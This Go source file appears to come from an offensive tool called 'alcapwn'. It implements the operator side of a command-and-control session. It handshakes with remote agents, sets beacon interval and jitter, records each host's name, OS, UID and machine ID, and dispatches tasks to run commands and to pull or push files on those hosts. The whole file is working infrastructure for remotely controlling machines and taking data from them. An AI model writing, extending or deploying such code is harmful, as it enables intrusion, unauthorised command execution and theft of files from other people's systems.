package main

import (
	"encoding/json"
	"fmt"
	"net"
	"sync"
	"time"

	"alcapwn/proto"
)

// agentTaskReq is an internal request from an operator command (cmdExec,
// cmdDownload, cmdUpload) to the handleAgentSession write loop.
// resultCh receives exactly one proto.Result: the agent's response or an
// error result if the session disconnects or the task times out.
type agentTaskReq struct {
	task     proto.Task
	resultCh chan proto.Result
}

// handleAgentSession manages the full lifecycle of an agent-protocol session:
//
//  1. Read Hello from agent (magic already consumed by acceptLoop prefixConn).
//  2. Send Welcome with assigned session ID.
//  3. Notify operator and populate sess.IsAgent / sess.AgentMeta.
//  4. Start a read goroutine that dispatches Results and answers Pings.
//  5. Run the write loop: forward Tasks from operator commands to the agent.
//
// The session is removed from the registry when the connection closes.
// Called from acceptLoop in its own goroutine, identically to handleSession.
func handleAgentSession(sess *Session, opts sessionOpts) {
	conn := sess.Conn

	// ── Phase 1: Handshake ───────────────────────────────────────────────────

	env, err := proto.ReadMsg(conn)
	if err != nil {
		opts.printer.Notify("[!] [%d] Agent handshake read failed: %v", sess.ID, err)
		conn.Close()
		opts.registry.Remove(sess.ID)
		return
	}
	if env.Type != proto.MsgHello {
		opts.printer.Notify("[!] [%d] Expected agent hello, got: %s", sess.ID, env.Type)
		conn.Close()
		opts.registry.Remove(sess.ID)
		return
	}
	var hello proto.Hello
	if err := json.Unmarshal(env.Data, &hello); err != nil {
		opts.printer.Notify("[!] [%d] Malformed agent hello: %v", sess.ID, err)
		conn.Close()
		opts.registry.Remove(sess.ID)
		return
	}

	if err := proto.WriteMsg(conn, proto.MsgWelcome, proto.Welcome{
		SessionID: sess.ID,
		Interval:  60,
		Jitter:    20,
	}); err != nil {
		opts.printer.Notify("[!] [%d] Could not send welcome: %v", sess.ID, err)
		conn.Close()
		opts.registry.Remove(sess.ID)
		return
	}

	// ── Phase 2: Session setup ───────────────────────────────────────────────

	taskCh := make(chan agentTaskReq, 16)
	sess.mu.Lock()
	sess.IsAgent = true
	sess.AgentMeta = &hello
	sess.agentTaskCh = taskCh
	sess.mu.Unlock()

	opts.printer.Notify("[+] Agent %d ready — %s  (%s/%s  uid=%s  mid=%s)",
		sess.ID, hello.Hostname, hello.OS, hello.Arch, hello.UID, hello.MachineID)

	// ── Phase 3: Bidirectional task dispatch ─────────────────────────────────

	var pendingMu sync.Mutex
	pending := make(map[string]chan proto.Result)

	done := make(chan struct{})

	// Read goroutine: handles Results coming back from the agent and replies to Pings.
	go func() {
		defer close(done)
		for {
			env, err := proto.ReadMsg(conn)
			if err != nil {
				return
			}
			switch env.Type {
			case proto.MsgResult:
				var res proto.Result
				if err := json.Unmarshal(env.Data, &res); err != nil {
					continue
				}
				pendingMu.Lock()
				ch, ok := pending[res.TaskID]
				if ok {
					delete(pending, res.TaskID)
				}
				pendingMu.Unlock()
				if ok {
					ch <- res
				}

			case proto.MsgPing:
				proto.WriteMsg(conn, proto.MsgPong, struct{}{}) //nolint:errcheck
			}
		}
	}()

	// Write loop: drain the task channel and forward Tasks to the agent.
	for {
		select {
		case <-done:
			// Agent disconnected — resolve any pending tasks with an error result.
			pendingMu.Lock()
			for id, ch := range pending {
				ch <- proto.Result{TaskID: id, Error: "agent disconnected"}
				delete(pending, id)
			}
			pendingMu.Unlock()
			opts.printer.Notify("[-] Agent %d disconnected", sess.ID)
			conn.Close()
			opts.registry.Remove(sess.ID)
			return

		case req := <-taskCh:
			pendingMu.Lock()
			pending[req.task.ID] = req.resultCh
			pendingMu.Unlock()
			if err := proto.WriteMsg(conn, proto.MsgTask, req.task); err != nil {
				req.resultCh <- proto.Result{TaskID: req.task.ID, Error: err.Error()}
				return
			}
		}
	}
}

// agentExec sends a TaskExec to the agent and blocks until the result arrives
// or timeout elapses.
func agentExec(sess *Session, command string, timeout time.Duration) (proto.Result, error) {
	return agentDispatch(sess, proto.Task{
		ID:      agentTaskID("ex", command),
		Kind:    proto.TaskExec,
		Command: command,
	}, timeout)
}

// agentDownload asks the agent to read remotePath and returns the file bytes.
func agentDownload(sess *Session, remotePath string) ([]byte, error) {
	res, err := agentDispatch(sess, proto.Task{
		ID:   agentTaskID("dl", remotePath),
		Kind: proto.TaskDownload,
		Path: remotePath,
	}, 60*time.Second)
	if err != nil {
		return nil, err
	}
	if res.Error != "" {
		return nil, fmt.Errorf("%s", res.Error)
	}
	return res.Output, nil
}

// agentUpload asks the agent to write data to remotePath.
func agentUpload(sess *Session, remotePath string, data []byte) error {
	res, err := agentDispatch(sess, proto.Task{
		ID:   agentTaskID("ul", remotePath),
		Kind: proto.TaskUpload,
		Path: remotePath,
		Data: data,
	}, 60*time.Second)
	if err != nil {
		return err
	}
	if res.Error != "" {
		return fmt.Errorf("%s", res.Error)
	}
	return nil
}

// agentDispatch is the shared send-and-wait helper for all task types.
func agentDispatch(sess *Session, task proto.Task, timeout time.Duration) (proto.Result, error) {
	sess.mu.Lock()
	ch := sess.agentTaskCh
	sess.mu.Unlock()
	if ch == nil {
		return proto.Result{}, fmt.Errorf("agent task channel not initialised")
	}

	resultCh := make(chan proto.Result, 1)
	req := agentTaskReq{task: task, resultCh: resultCh}

	select {
	case ch <- req:
	case <-time.After(2 * time.Second):
		return proto.Result{}, fmt.Errorf("task queue full or session not ready")
	}

	select {
	case res := <-resultCh:
		return res, nil
	case <-time.After(timeout):
		return proto.Result{}, fmt.Errorf("task timed out after %v", timeout)
	}
}

// agentTaskID returns a short unique task ID built from a prefix and content hash.
func agentTaskID(prefix, content string) string {
	t := time.Now().UnixNano()
	return fmt.Sprintf("%s%x%x", prefix, t, len(content))
}

// agentConn returns the net.Conn used by an agent session, or nil.
// Used by cmdKill to close the connection gracefully.
func agentConn(sess *Session) net.Conn {
	sess.mu.Lock()
	defer sess.mu.Unlock()
	if !sess.IsAgent {
		return nil
	}
	return sess.Conn
}
